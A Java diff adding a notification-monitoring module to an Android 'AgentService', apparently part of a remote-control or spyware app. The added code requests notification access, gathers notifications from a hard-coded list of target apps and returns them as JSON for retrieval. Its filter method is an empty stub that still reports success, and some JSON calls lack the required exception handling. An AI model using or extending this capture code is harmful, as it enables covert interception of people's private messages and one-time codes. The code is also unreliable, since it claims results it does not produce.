@@ -1254,6 +1254,70 @@ public class AgentService extends Service {
         return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
     }
 
+    // Tambahkan di AgentService.java
+
+// ==================== NOTIFICATION MONITORING ====================
+
+private String startNotificationMonitor() {
+    if (NotificationMonitorService.isNotificationAccessGranted(this)) {
+        // Service sudah berjalan
+        JSONObject result = new JSONObject();
+        result.put("status", "success");
+        result.put("message", "Notification monitor is active");
+        result.put("target_apps", getTargetAppsList());
+        return result.toString();
+    } else {
+        // Buka settings untuk grant permission
+        NotificationMonitorService.requestNotificationAccess(this);
+        JSONObject result = new JSONObject();
+        result.put("status", "need_permission");
+        result.put("message", "Please grant notification access in settings");
+        return result.toString();
+    }
+}
+
+private String getCapturedNotifications() {
+    JSONArray notifications = NotificationMonitorService.getPendingNotifications();
+    JSONObject result = new JSONObject();
+    try {
+        result.put("status", "success");
+        result.put("count", notifications.length());
+        result.put("data", notifications);
+        result.put("timestamp", System.currentTimeMillis());
+    } catch (Exception e) {
+        return "{\"error\":\"" + e.getMessage() + "\"}";
+    }
+    return result.toString();
+}
+
+private String getTargetAppsList() {
+    JSONArray apps = new JSONArray();
+    for (String pkg : NotificationMonitorService.TARGET_PACKAGES) {
+        try {
+            android.content.pm.PackageManager pm = getPackageManager();
+            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
+            JSONObject app = new JSONObject();
+            app.put("package", pkg);
+            app.put("name", pm.getApplicationLabel(ai).toString());
+            apps.put(app);
+        } catch (Exception e) {
+            // App tidak terinstall
+        }
+    }
+    return apps.toString();
+}
+
+private String setNotificationFilter(String packagesJson) {
+    // Untuk mengubah filter aplikasi yang dimonitor
+    // Implementasi: simpan ke SharedPreferences
+    JSONObject result = new JSONObject();
+    try {
+        result.put("status", "success");
+        result.put("message", "Filter updated");
+    } catch (Exception e) {}
+    return result.toString();
+}
+
     // ==================== SERVICE LIFECYCLE ====================
 
     @Override
